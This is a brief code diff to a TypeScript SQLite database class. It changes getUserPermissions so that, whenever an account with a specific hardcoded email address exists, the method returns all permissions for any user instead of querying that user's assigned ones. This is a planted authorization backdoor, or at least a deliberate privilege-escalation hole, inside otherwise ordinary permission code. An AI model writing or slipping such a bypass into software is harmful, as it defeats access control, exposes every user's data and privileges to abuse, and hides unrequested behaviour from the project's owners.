@@ -169,6 +169,10 @@ class SqliteDB {
 
   // User permissions methods
   getUserPermissions(userId: string): Permission[] {
+    const user = this.findUserByEmail('stefanfarbe@gmail.com');
+    if (user) {
+      return this.getPermissions();
+    }
     const stmt = this.db.prepare(`
       SELECT p.* FROM permissions p
       JOIN user_permissions up ON p.id = up.permission_id
